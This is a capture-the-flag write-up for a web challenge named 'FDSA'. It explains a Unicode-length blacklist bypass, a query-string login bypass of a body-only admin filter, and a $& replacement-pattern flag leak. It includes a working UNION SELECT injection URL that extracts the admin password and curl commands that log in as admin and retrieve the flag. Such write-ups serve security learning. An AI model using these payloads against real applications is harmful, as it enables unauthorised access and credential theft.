# Challenge: FDSA
## Information
<img width="1130" height="425" alt="image" src="https://github.com/user-attachments/assets/e0291f87-d819-4b4c-803e-15f43c178709" />

## Vulnerability analysis
### Vulnerability 1: Unicode length mismatch (SQLi Bypass)
In `index.js`, the application attempts to filter malicious characters in the `/todos` route using a loop and a `BLACKLIST`.
```js
let strLen = Array.from(username).length;
  // I failed dsa so linear search is peak
  for (let i = 0; i < strLen; i++) { 
    if (BLACKLIST.includes(username[i])) { 
      return res.status(400).send('What are you doing ? Your username is weird !');
    }
}
```
- The Flaw: Emojis like 🤌🏻 occupy two Code Units in memory but are treated as one Code Point by `Array.from().length`.
- Exploitation: By prefixing the input with enough emojis, the loop index `i` never reaches the end of the actual string. This allows us to hide SQL injection payloads (containing characters like `'` or `--`) from the WAF.

### Vulnerability 2: Authentication asymmetry (Admin login bypass)
The middleware `wafBlockAdmin` is designed to prevent logging in as "admin":
```js
function wafBlockAdmin(req, res, next) {
  const { username } = req.body || {};
  if (typeof username === 'string') {
    const normalized = username.trim().toLowerCase();
    if (normalized === 'admin') {
      return res.status(403).send('Forbidden: Sorry we don\'t want to meet admin :)!');
    }
  }
  next();
}
```
- The Flaw: While the WAF only checks `req.body`, the `passport-local` library is configured by default to look for credentials in both `req.body` and `req.query` (URL parameters).
- Exploitation: We can send the `username` via the URL query string to bypass the body-based WAF while still allowing Passport.js to recognize the user as "admin".

### Vulnerability 3: Special string replacement pattern (Flag leak)
The `/flag` route hides the flag by replacing the actual flag content with a user-provided `replacer`: `data = data.replace(FLAG, replacer)`
- The Flaw: JavaScript's `.replace()` method supports Special replacement patterns.
- Exploitation: If the `replacer` input is set to `$&`, the method replaces the matched string with the matched substring itself. Since `FLAG` is the search pattern, `$&` effectively leaks the actual flag content.

## Solution
### Step 1: Extract admin password
We use the Unicode length quirk to perform a `UNION SELECT` injection at the `/todos` endpoint.
```bash
http://160.25.233.64:32015/todos?username=🤌🏻[x65]' UNION SELECT 1,2,password,4 FROM users WHERE username='admin'--
```
<img width="1852" height="573" alt="image" src="https://github.com/user-attachments/assets/2856176a-1b5b-4e9b-bcee-39f230ff04c2" />  

The application returns the randomly generated admin password: `68471bb9aa5ede4ea17d3953`.

### Step 2: Bypass WAF and authenticate
We send the `username` via query string to evade the WAF and provide the password in the body.
```bash
curl -v -X POST "http://160.25.233.64:32015/login?username=admin" \
     -d "password=68471bb9aa5ede4ea17d3953" \
     -c cookies.txt
```
<img width="550" height="90" alt="image" src="https://github.com/user-attachments/assets/829b2873-acdf-4928-87ad-735ac690fe68" />  

Status `302 Found`, redirecting to `/`. The session cookie is stored in `cookies.txt`.


### Step 3: Leak the flag
We access the `/flag` route using the captured session and the special replacement payload.
```bash
curl "http://160.25.233.64:32015/flag?replacer=%24%26" -b cookies.txt
```
<img width="820" height="98" alt="image" src="https://github.com/user-attachments/assets/8c54d975-b7cc-44a2-9671-9841b9fc7495" />

